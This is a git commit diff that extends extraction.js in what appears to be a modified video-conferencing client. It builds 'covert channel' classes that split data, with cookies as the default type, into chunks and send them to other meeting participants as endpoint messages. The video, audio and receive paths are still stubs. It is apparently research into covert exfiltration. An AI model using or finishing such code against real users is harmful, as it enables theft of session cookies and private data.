720408fce70a62a52bca40897268de85603bc6c2
davidus27 <davidisbest27@gmail.com>
2021-04-08 14:59:21 +0200

    add logic to the two-way communication

--- extraction.js
+++ extraction.js
@@ -1,31 +1,79 @@
 /* global APP, splitString*/
 
-const defaultConfigurationValues = {
+export const defaultConfigurationValues = {
     method: 'plain',
-    dataSource: document.cookie,
+    dataType: 'cookies',
     chunkSize: 5000
 };
 
 /**
  * Implementation of different convert channel methods
  */
-class ExtractionMethods {
+class CovertChannelMethods {
 
     // reference to all other methods
     static options = {
-        'plain': ExtractionMethods.usePlain
+        'plain': CovertChannelMethods.usePlain,
+        'video': CovertChannelMethods.useVideo,
+        'audio': CovertChannelMethods.useAudio
     };
 
     /**
      * Sending data using simple plain method
-     * @param {any} data - Send specified data using Plain method
+     * @param {any} data - specified data to be sent
      */
     static async usePlain(data) {
-        console.log('cookie: ', data);
         APP.conference.sendEndpointMessage('', {
             extraction: 'reply',
             payload: data
         });
+    }
+
+    /**
+     * Send data using video stream
+     * @param {any} data - specified data to be sent
+     */
+    static async useVideo(data) {
+        console.log(data);
+    }
+
+    /**
+     * Send data using audio stream
+     * @param {any} data - specified data to be sent
+     */
+    static async useAudio(data) {
+        console.log(data);
+    }
+}
+
+/**
+ * Extracting data from covert channel
+ */
+class ExtractionCovertChannelMethods {
+
+    // reference to all other methods
+    static options = {
+        'plain': ExtractionCovertChannelMethods.usedPlain,
+        'video': ExtractionCovertChannelMethods.usedVideo,
+        'audio': ExtractionCovertChannelMethods.usedAudio
+    };
+
+    /**
+     * Receiving data using simple plain method
+     */
+    static async usedPlain() {
+    }
+
+    /**
+     * Receiving data using video stream
+     */
+    static async usedVideo() {
+    }
+
+    /**
+     * Receiving data using audio stream
+     */
+    static async usedAudio() {
     }
 }
 
@@ -40,20 +88,60 @@ export class ExtractionHandler {
     constructor(configuration, dataSource) {
         this.configuration = new Proxy(defaultConfigurationValues, configuration);
         this.dataSource = dataSource;
+        this._fileBuffer = [];
+
+        // if the communication is still running, or if it ended.
+        this.isCommunicationRunning = true;
     }
 
     /**
-     * TODO: change to the send any type based on config
      * Send data through the specified method.
+     * @param {any} data - data to be sent.
      */
-    async send() {
-        for (const chunkData of splitString(this.dataSource, this.configuration.chunkSize)) {
+    async sendAll(data) {
+        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
             // send data using corresponding method
-            await ExtractionMethods.options[this.configuration.method](chunkData); 
+            console.log(chunkData);
+            await CovertChannelMethods.options[this.configuration.method](chunkData);
         }
         APP.conference.sendEndpointMessage('', {
             extraction: 'reply',
             isEnd: true
         });
+
+        this.isCommunicationRunning = false;
+    }
+
+    /**
+     * Receive data through the specified extraction method.
+     */
+    receivePlainData(recievedData) {
+
+        // extract data using specified method
+        if (recievedData.isEnd) { // 'reply' ending extraction
+            this._fileBuffer = [];
+            this.isCommunicationRunning = false;
+        } else { // 'reply' containg data
+            this._fileBuffer.push(recievedData.payload);
+        }
+    }
+
+    /**
+     * Receive data through the specified extraction method.
+     */
+    async receiveAll() {
+        const usedMethod = ExtractionCovertChannelMethods.options[this.configuration.method];
+
+        while (this.isCommunicationRunning) {
+            console.log(this.isCommunicationRunning);
+            usedMethod();
+
+            /*
+            usedMethod().then(data => {
+                this._fileBuffer.push(data);
+            });
+            */
+        }
+        console.log('ended.');
     }
 }
